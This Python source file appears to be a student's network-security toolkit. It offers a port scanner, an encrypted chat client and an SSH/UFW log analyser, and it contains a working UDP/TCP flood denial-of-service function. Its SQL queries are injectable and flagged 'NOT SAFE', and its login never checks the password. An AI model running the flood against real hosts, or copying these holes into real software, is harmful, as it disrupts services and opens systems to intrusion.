"""
Trabalho de LPD
@author:João Estevão
"""
import os
from argon2 import PasswordHasher
from datetime import datetime
import socket
import time
import threading
from scapy.all import *
from queue import Queue
import random
from random import randint
from os import system, name
from Crypto.PublicKey import RSA
from Crypto import Random
from Crypto.Cipher import PKCS1_OAEP
import traceback
import sqlite3
import geoip2.database
import re
import sys
from sys import stdout
import folium
from folium.plugins import HeatMap
import ipaddress
from reportlab.pdfgen import canvas
from reportlab.lib.pagesizes import letter, inch
from reportlab.lib.units import mm, cm
from reportlab.platypus import Image, Paragraph, SimpleDocTemplate, Table, Spacer
from reportlab.lib import colors
from reportlab.lib.enums import TA_JUSTIFY, TA_LEFT, TA_CENTER, TA_RIGHT
from reportlab.lib.styles import ParagraphStyle, getSampleStyleSheet


def authentication(user, passwd):
    """
    Authenticates a user using argon2 as the password-hashing function.

    Parameters
    -------
    user : string
        The user that is trying to authenticate.
    passwd : string
        The password inputted.

    Returns
    -------
    is_authenticated : boolean
        Returns True if the user/password combo is in the db, otherwise returns False.

    """
    is_authenticated = False

    ph = PasswordHasher()

    # If no register , this is not necessary
    ##############################
    # hash = ph.hash(passwd)      #
    # print(hash)                 #
    ##############################

    # DB connection
    try:
        conn = sqlite3.connect('lpd_database.db')
        sqlite_select_Query = "select hash from user where name='%s'" % (
            user)  # !!! NOT SAFE
        cursor = conn.cursor()
        cursor.execute(sqlite_select_Query)
        record = cursor.fetchall()
        cursor.close()

    except sqlite3.Error as error:
        print("DB Error: " + str(error))

    # Get hash from DB by user
    if record:
        # record format [(X,)]
        a = record[0][0]

        try:
            ph.verify(a, passwd)
            is_authenticated = True
        except Exception as e:
            print(e)

    return is_authenticated


def login():
    """
    
    Parameters
    -------
    user : string
    passwd : string
        The password inputted.

    Returns
    -------
    is_authenticated : boolean
        Returns True and the user name.

    """
    is_allowed = True
    user = input("Enter the username: ")
    passwd = input("Enter the password: ")

    return is_allowed, user





def active_connections():
    """
    This function aims to determine the active connections on the machine.
    It uses the command "netstat -a" to get information about the active connections and
    stores this information in a variable called "netstat".
    It then breaks this information into lines and prints them to the screen.

    
    Parameters
    -------
    netstat : netstat -a list

    Returns
    -------
    active connections on the machine


    """
    print("Calculating active connections...")

    netstat = os.popen("netstat -a").read()
    out_line = netstat.split("\n")

    print(netstat)


def port_scanner():
    """
    This function aims to perform a port scan on a specific target.
    It uses Python's socket module to connect to different ports on
    the target and check if they are open or closed.
    It starts by asking the user to enter the target to be scanned and
    gets the IP address of that target.
    Then it defines a function called "portscan" that tries to connect
    to a specific port on the target and,
    if the connection is successful, prints out the open port. If the
    connection is not successful, the function passes.
    It also defines a function called "threader" that creates multiple
    threads to perform the port scan in parallel, which speeds up the process.
    It uses a queue to store the ports to be scanned and measures the time spent on the scan.


        Parameters
        -------
        target : string

        Returns
        -------
        open ports in target and Time taken
    """
    socket.setdefaulttimeout(0.25)
    print_lock = threading.Lock()

    target = input('Enter the host to be scanned: ')
    t_IP = socket.gethostbyname(target)
    print('Starting scan on host: ', t_IP)

    def portscan(port):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            con = s.connect((t_IP, port))
            with print_lock:
                print(port, 'is open')
            con.close()
        except:
            pass

    def threader():
        while True:
            worker = q.get()
            portscan(worker)
            q.task_done()

    q = Queue()
    startTime = time.time()

    for x in range(100):
        t = threading.Thread(target=threader)
        t.daemon = True
        t.start()

    for worker in range(1, 8080):
        q.put(worker)

    q.join()
    print('Time taken:', time.time() - startTime)




def flood():
    
    """
    The "udpflood" function is a denial-of-service (DoS) attack script that sends UDP or TCP
    packets to a specific host on the specified on the specified port.
    The script prompts the user for information such as the IP address of the host, the port,
    whether to send UDP or TCP packets, and the number of packets to be sent over a single connection.
    It also allows the user to specify the number of threads they want to use to send the packets.
    It does this by creating multiple threads with the "Thread" method of the "threading" library
    and then starts these threads with the "start()" method. The script also has a "new" function that
    allows the user to start the attack again with the same settings without having to rerun the whole script.

    Parameters
    -------
    ip : string
    port : int
    choice : string
    times : int
    threads : int

    Returns
    -------
    udp or tcp flood atack 
    """
    ip = str(input(" Host/Ip:"))
    port = int(input(" Port:"))
    choice = str(input(" chose run flood atack (udp/tcp):"))
    times = int(input(" Packets per one connection:"))
    threads = int(input(" Threads:"))

    def run():
        data = random._urandom(1024)
        while True:
            try:
                # UDP = SOCK_DGRAM
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                addr = (str(ip), int(port))
                for x in range(times):
                    s.sendto(data, addr)
            except:
                s.close()

    def run2():
        data = random._urandom(16)
        while True:
            try:
                # TCP = SOCK_STREAM
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((ip, 80))
                s.send(data)
                for x in range(times):
                    s.send(data)
            except:
                s.close()

    for y in range(threads):
        if choice == 'udp':
            th = threading.Thread(target=run)
            th.start()
        else:
            th = threading.Thread(target=run2)
            th.start()

    def new():
        for y in range(threads):
            if choice == 'udp':
                th = threading.Thread(target=run)
                th.start()
            else:
                th = threading.Thread(target=run2)
                th.start()


def chat():
    """
    The chat() function is responsible for implementing the client side of a messaging application.
    It allows the user to choose a server to send an RSA-encrypted message to and also read all messages sent to the server.
    The function presents a number of options for the user, such as sending an encrypted message, reading messages from the server or
    exiting the application. When choosing option 1, the user is prompted for the server's IP address and port, and then the function checks
    if there are already RSA keys generated to encrypt the message. If not, the user is prompted to generate a new key.
    The message is then encrypted and sent to the server over a socket connection.
    Option 2 allows the user to read the messages sent to the server by again entering the server's IP address and port.
    The function uses the sqlite3 library to connect to the database and retrieve the user ID.
    The function also uses the socket library to establish the connection to the server and the RSA library to encrypt and decrypt the messages.
    
    Parameters
    -------
    ip : string
    port : int
    choice : string
    times : int
    threads : int

    Returns
    -------
    udp or tcp flood atack 
    """

    options_chat = '''\nChoose a option:

    [1]->Send message encrypted with RSA.
    [2]->Read messages from server.
    [3]->Exit.
        '''

    # Get id of user from database
    try:
        conn = sqlite3.connect('lpd_database.db')
        sqlite_select_Query = "select id from user where name='%s'" % (
            user)  # !!! NOT SAFE
        cursor = conn.cursor()
        cursor.execute(sqlite_select_Query)
        record = cursor.fetchall()
        cursor.close()

    except sqlite3.Error as error:
        print("DB Error: " + str(error))

    while True:

        print("-" * 50)
        print(options_chat)
        print("-" * 50)
        answer = input("\n>")
        print("\n")
        if answer == "1":

            print("Whats the server ip?")
            server_ip = input("\n>")
            print("\nWhats the server port?")
            server_port = input("\n>")

            try:
                test = int(server_port)
            except ValueError:
                print("Choose a NUMBER for the port!")
                chat()

            try:

                # Checking for RSA keys
                while True:
                    print("\nGenerate public key and private key? y/n ")
                    key_question = input("\n>")

                    if key_question == "y":
                        key = RSA.generate(RSA_BIT)
                        private_key = key.export_key()
                        file_out = open("private.pem", "wb")
                        file_out.write(private_key)
                        file_out.close()

                        public_key = key.publickey().export_key()
                        file_out = open("receiver.pem", "wb")
                        file_out.write(public_key)
                        file_out.close()
                        break
                    elif key_question == "n":
                        try:
                            file_out = open("private.pem", "rb")
                            file_out = open("receiver.pem", "rb")
                            break
                        except:
                            print(
                                "Cant find keys generate from this application, please generate one pair.")
                    else:
                        print("Write 'y' or 'n'.")

                # Encrypting message
                print("\nWhat is the message you want to send?")
                message = input("\n>")

                data = message.encode('utf-8')
                # data = str.encode(message)

                # Encrypt the data with the public RSA key
                key = RSA.importKey(open('receiver.pem').read())
                cipher = PKCS1_OAEP.new(key)
                ciphertext = cipher.encrypt(data)

                print(ciphertext)

                # Create connection with server
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                host = server_ip                                           # server address
                # server port
                port = int(server_port)
                s.connect((host, port))

                # Send id to server
                s.send(str(record[0][0]).encode())

                dataFromServer = s.recv(1024)
                print("My ID: " + dataFromServer.decode())

                # Tell server that we want to write our messages
                dataToServer = "WRITE"
                s.send(dataToServer.encode())

                # Send ciphertext
                s.send(ciphertext)

                # close connection
                s.close()

            except Exception as e:
                print("\n" + "ERROR:" + str(e))
                print(traceback.format_exc())

        elif answer == "2":
            print("Whats the server ip?")
            server_ip = input("\n>")
            print("\nWhats the server port?")
            server_port = input("\n>")

            try:
                test = int(server_port)
            except ValueError:
                print("Choose a NUMBER for the port!")
                chat()

            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                host = server_ip                                           # server address
                # server port
                port = int(server_port)
                s.connect((host, port))

                # Send id to server
                s.send(str(record[0][0]).encode())

                # Check id from server
                dataFromServer = s.recv(1024)
                print("My ID: " + dataFromServer.decode())

                # Tell server that we want to read our messages
                dataToServer = "READ"
                s.send(dataToServer.encode())

                # Get messages from server
                dataFromServer2 = s.recv(1024)

                msg_array = []
                counter = 0

                while dataFromServer2:
                    # print(1)
                    # print(dataFromServer2)

                    if b'You have no messages!' in dataFromServer2:
                        s.close()
                        dataFromServer2 = dataFromServer2.replace(
                            b'You have no messages!', b'')
                        counter = 1

                    # Prob need to split messages .... sadge
                    if b'LIMITER' in dataFromServer2:

                        # print(dataFromServer2.split(b'LIMITER'))
                        a = dataFromServer2.split(b'LIMITER')

                        for i in a:
                            if i:
                                msg_array.append(i.replace(b'LIMITER', b''))

                        # print(dataFromServer2)
                    if b'You have no messages!' not in dataFromServer2 and counter == 1:
                        # msg_array = list(set(msg_array))
                        print("XXXXXXXXXXXXXXXX")
                        for j in msg_array:
                            try:
                                # Decrypting message
                                key = RSA.importKey(open('private.pem').read())
                                cipher = PKCS1_OAEP.new(key)
                                message = cipher.decrypt(j)
                                print(message)
                            except Exception as e:
                                print(e)

                    if counter == 1:
                        break
                    else:
                        dataFromServer2 = s.recv(1024)
                # Close conenction
                # s.close()

            except Exception as e:
                print("\n" + "ERROR:" + str(e))
                print(traceback.format_exc())

        elif answer == "3":
            break
        else:
            print("Choose a NUMBER between 1 and 3.")



def log_manager():
    """
    The function log_manager() is responsible for analyzing the logs provided by the teacher and 
    creating a heatmap for each log. It presents a menu interface for the user to choose between analyzing the UFW or SSH logs. 
    If the UFW option is chosen, the function opens the corresponding log file, extracts all IP addresses and 
    stores them in a list. It also uses the geoip2 library to get the geographic coordinates of these IP addresses and 
    print out the countries from which these IPs were blocked. It then generates and saves a heatmap with these coordinates and 
    creates a PDF file with information about the blocked IPs. If the SSH option is is chosen, the function runs a command to 
    create a file with all logs of failed login attempts, extracts the IP addresses and times of these events and stores them in a list. 
    It also uses the geoip2 library to get the geographic coordinates of these IP addresses and generates and saves a heatmap with these 
    coordinates and creates a PDF file with information about the failed login attempts. failures. The function also has an option to exit the menu.
    Parameters
    -------
    Choose a option to read log files 

    Returns
    -------
    generate_pdf with with all logs of failed login attempts, extracts the IP addresses and times of these events and stores them in a list anf geo location
    
    """
    options_chat = '''\nChoose a option:

[1]->UFW logs.
[2]->SSH logs.
[3]->Exit.
    '''

    while True:
        print("-" * 50)
        print(options_chat)
        print("-" * 50)
        answer = input("\n>")
        print("\n")
        if answer == "1":
            # ufw logs

            # Set path ...
            abspath = os.path.abspath(__file__)
            dname = os.path.dirname(abspath)
            os.chdir(dname)

            ips = []
            p = re.compile(
                '(^[a-zA-Z]{3} [0-9]{2} [0-9]{2}:[0-9]{2}:[0-9]{2})(.*?)(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})')

            with open(dname + '/logs/ufw.log') as f:
                for lines in f.readlines():

                    match = p.search(lines)
                    if match:

                        ip = match.group(3)
                        timestamp = match.group(1)

                        is_private = ipaddress.ip_address(ip).is_private

                        if is_private:
                            pass
                            # print("SRC IP IS PRIVATE:"+srcIp)
                        else:
                            # print("SRC IP IS PUBLIC:"+srcIp)
                            ips.append((ip, timestamp))

            coords = []

            # GeoLite2-City.mmdb
            client = geoip2.database.Reader('GeoLite2-City.mmdb')
            # $ curl ipinfo.io/ip

            # removing duplicates
            # ips = list(set(ips))
            ip_country = []
            print("Countries of IPs that were blocked:")

            for ip in ips:
                response = client.city(str(ip[0]))

                lat = response.location.latitude
                lon = response.location.longitude
                print(response.country.name + ": " +
                      str(ip[0]) + ' at ' + str(ip[1]))
                ip_country.append(
                    (response.country.name, str(ip[0]), str(ip[1])))
                coords.append((lat, lon))

            # generate and save heatmap
            m = folium.Map(tiles="OpenStreetMap",
                           location=[20, 10], zoom_start=2)
            # mess around with these values to change how the heatmap looks
            HeatMap(data=coords, radius=15, blur=20, max_zoom=2).add_to(m)
            m.save("ufw_log_heatmap_trb")
            print('\nDone. Heatmap saved as ufw_log_heatmap_trb.')

            # Generate a pdf
            generate_pdf("ufw_log_info.pdf", ip_country, "UFW Block IPs")

        elif answer == "2":
            # SSH logs

            # Create file to parse
            # "grep "Failed password" /var/log/auth.log > failed_attempts.txt"
            ssh_log = os.popen(
                "grep 'Failed password' ./logs/auth.log ").read()
            ssh_log = ssh_log.split('\n')

            # get ip from logs
            # p = re.compile('\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}')
            p = re.compile(
                '(^[a-zA-Z]{3} [0-9]{2} [0-9]{2}:[0-9]{2}:[0-9]{2})(.*?)(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})')
            # get timestamps Feb 22 08:48:13 ubinet sshd[22468]: Failed password for root from 65.207.23.201 port 32839 ssh2
            # timestamp = line[:15]

            # ips=[]
            ips_timestamp = []
            for x in ssh_log:
                if x:
                    match = p.search(x)
                    if match:
                        ip = match.group(3)
                        timestamp = match.group(1)

                        is_private = ipaddress.ip_address(ip).is_private

                        if is_private:
                            pass
                        else:
                            # ips.append(ip)
                            ips_timestamp.append((ip, timestamp))

            # get ip coordinates with geoip...

            coords = []

            # GeoLite2-City.mmdb
            client = geoip2.database.Reader('GeoLite2-City.mmdb')
            # $ curl ipinfo.io/ip

            # removing duplicates
            # ips = list(set(ips))

            ip_country = []

            print("Calculating...")

            for ip in ips_timestamp:

                response = client.city(str(ip[0]))

                lat = response.location.latitude
                lon = response.location.longitude
                ip_country.append(
                    (response.country.name, str(ip[0]), str(ip[1])))
                coords.append((lat, lon))

            # generate and save heatmap
            m = folium.Map(tiles="OpenStreetMap",
                           location=[20, 10], zoom_start=2)
            # mess around with these values to change how the heatmap looks
            HeatMap(data=coords, radius=15, blur=20, max_zoom=2).add_to(m)
            m.save("auth_log_heatmap_trb")
            print('\nDone. Heatmap saved as auth_log_heatmap_trb.')

            # Generate a pdf
            generate_pdf("ssh_log_info.pdf", ip_country,
                         "SSH password failed attempts information")

        elif answer == "3":
            break
        else:
            print("Choose a NUMBER between 1 and 3.")


def generate_pdf(filename, ip_country, title):
    """
    The above function is used to generate a PDF file based on three arguments: the filename a list of tuples with IP, 
    country and timestamp information, and a title. 
    The first step is to print a message that the report is being created. 
    Next a SimpleDocTemplate object is created with the file name and page size. 
    A "Flowable" object container is created and a title is added to the report using the Paragraph object and object and a specific font style. 
    Next, a table is created from the list of tuples passed as argument and added to the element container.
    Finally, the document is built and saved with the specified name. 
    The function also prints a message that the PDF has been successfully saved.
    """

    print("\nCreating report...")

    doc = SimpleDocTemplate(filename, pagesize=letter)

    # container for the 'Flowable' objects
    elements = []

    # TITLE
    styleSheet = getSampleStyleSheet()
    styleSheet.leading = 24
    styleSheet.add(ParagraphStyle(name='Normal_CENTER',
                                  parent=styleSheet['Normal'],
                                  fontName='Helvetica',
                                  wordWrap='LTR',
                                  alignment=TA_CENTER,
                                  fontSize=12,
                                  leading=13,
                                  textColor=colors.black,
                                  borderPadding=0,
                                  leftIndent=0,
                                  rightIndent=0,
                                  spaceAfter=0,
                                  spaceBefore=0,
                                  splitLongWords=True,
                                  spaceShrinkage=0.05,
                                  ))
    elements.append(Paragraph(title, styleSheet['Normal_CENTER']))

    ##### TABLE##########

    data = []

    for line in ip_country:
        data.append(list(line))

    f = Table(data)
    elements.append(Spacer(1, 0.5*cm))
    elements.append(f)
    doc.build(elements)
    print('\nDone. PDF saved as ' + filename+'.')


if __name__ == '__main__':

    RSA_BIT = 3072

    banner = '''
    MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWWNNNNNNWWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMN0kocc:::::::::cldOXWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWKxc;;:ldxO0KKKKK0Oxoc;;:lONMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNOc,;oOXWMMMMMMMMMMMMMMMNKxc,;oKWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWO:'cONMMMMMMMWWNNNNWWMMMMMMMWXx;'lKWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMKl':0WMMMMMN0xlc:::::::cokKWMMMMMNx,,xNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMW0;'xNMMMMWKo;,:oxO0KKK0kdc;,:kNMMMMMKc.lXMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMM0,'kWMMMMXo';dKWMMMMMMMMMMMNOl';kWMMMMNl.lNMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMX:.xWMMMMK:.oXMMMMMMMMMMMMMMMMW0:.oNMMMMXc.xWMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMWx.:XMMMMX:.xWMMMMMMMMMMMMMMMMMMMXc.dWMMMMO.;KMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMWl.dWMMMMx.cNMMMMMMMMMMMMMMMMMMMMMO',KMMMMX:.kMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMN:.kMMMMWl.dWMMMMMMMMMMMMMMMMMMMMMX;.OMMMMNc.xMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMX:.kMMMMWl.dWMMMMMMMMMMMMMMMMMMMMMX:.OMMMMWl.xMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMN:.kMNXK0:.dWMMMMMMMMMMMMMMMMMMMMMX:.OMMMMWl.xMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMN:.kWd',;,;OMMMMMMMMMMMMMMMMMMMMMMX:.OMMMMWl.xMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMN:.kNc.cOO0NMMMMMMMMMMMMMMMMMMMMMMX:.OMMMMWl.xMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMN:.kWx,,;',kMMMMMMMMMMMMMMMMMMMMMMX:.OMMMMWl.xMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMN:.dXKOOk;.dMMMMMMMMMMMMMMMMMMMMMMX:.OMMMMWl.xMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMNo';:::::,;OMMMMMMMMMMMMMMMMMMMMMMX:.OMMMMWl.xMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMWXXXXXXXXNWMMMMMMMMMMMMMMMMMMMMMMX:.OMMMMWl.xMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMWNNXNNNNNNXNNNNNNNNNNNNNNNNNNNNNNN0;.xNNNNKc.dWMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMXxc::::::::::::::::::::::::::::::::::;'.,:::::'.,:oONMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMXd,,okKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKK0xc,:OWMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMW0:'oXMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMW0:'oNMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMK;.kWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNXXXXXXX0;.oNMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMWo.oWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWk::::::::,.'OMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMN:.kMMMMMMMMMMMMMMMMMMMMMMMMMWWNWWMMMMMMMMMMMMMMMNXXK00000O;.xMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMX:.kMMMMMMMMMMMMMMMMMMMMMMXxc:::::lONMMMMMMMMMMMMMMWOc::::;..dMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMX:.kMMMMMMMMMMMMMMMMMMMMWk,,lk000x:'cKMMMMMMMMMMMMMMNK0000O;.dMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMX:.kMMMMMMMMMMMMMMMMMMMMK,'OMMMMMMWo.lWMMMMMMMMMMMMMMMNd:::..dMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMX:.kMMMMMMMMMMMMMMMMMMMM0,'0MMMMMMWo.lWMMMMMMMMMMMMMMMWKOOk;.dMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMX:.kMMMMMMMMMMMMMMMMMMMMWx',dXMMW0l':KMMMMMMMMMMMMMMMMMMMMWl.dMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMX:.dXXXNMMMMMMMMMMMMMMMMMWKc.cNM0,.dNMMMMMMMMMMMMMMMMMMMMMWl.dMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMX: '::cOWMMMMMMMMMMMMMMMMMMk.:NMO.;XMMMMMMMMMMMMMMMMMMMMMMWl.dMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMX:.o000XNNWMMMMMMMMMMMMMMMMk.;0Nx.;XMMMMMMMMMMMMMMMMMMMMMMWl.dWMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMX: ':::::oXMMMMMMMMMMMMMMMMXo,;:;;kWMMMMMMMMMMMMMMMMMMMMMMWl.dMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMX:.o00000KNWWMMMMMMMMMMMMMMMWNKKXNMMMMMMMMMMMMMMMMMMMMMMMMWl.xMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMWl..::::::::lKMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMX;.OMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMM0,.lO000000KNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNo.lNMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMWO,'kNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMXl.cXMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMWKl':xKNNWNNNWNWNNWWWWWWWWWWWWWWWWWWWWWWWWWWWWWNWWNX0o,,xNMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMW0o:;::::::::::::::::::::::::::::::::::::::::::::;;cxXWMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMWXK0000000000000000000000000000000000000000000KNWMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
                                        ▄▄▄     ▄▄▄▄▄▄▄ ▄▄▄▄▄▄  
                                        █   █   █       █      █ 
                                        █   █   █    ▄  █  ▄    █
                                        █   █   █   █▄█ █ █ █   █
                                        █   █▄▄▄█    ▄▄▄█ █▄█   █
                                        █       █   █   █       █
                                        █▄▄▄▄▄▄▄█▄▄▄█   █▄▄▄▄▄▄█ 

    '''

    options = '''\nChoose a option:

[1]->Port Scan.
[2]->Connections active.
[3]->Secure messaging service.
[4]->Analyze and process log files.
[5]->flood DOS atack.
[x]->Exit.
    '''

    print(banner)

    allowed, user = login()

    while True:
        if allowed:
            print("-" * 50)
            print("Welcome %s !" % user)
            print(options)
            print("-" * 50)
            answer = input("\n>")
            print("\n")
            if answer == "1":
                port_scanner()
            elif answer == "2":
                active_connections()
            elif answer == "3":
                chat()
            elif answer == "4":
                log_manager()
            elif answer == "5":
                flood()
            elif answer == "x":
                break

            else:
                print("Choose a NUMBER between 1 and 5.")
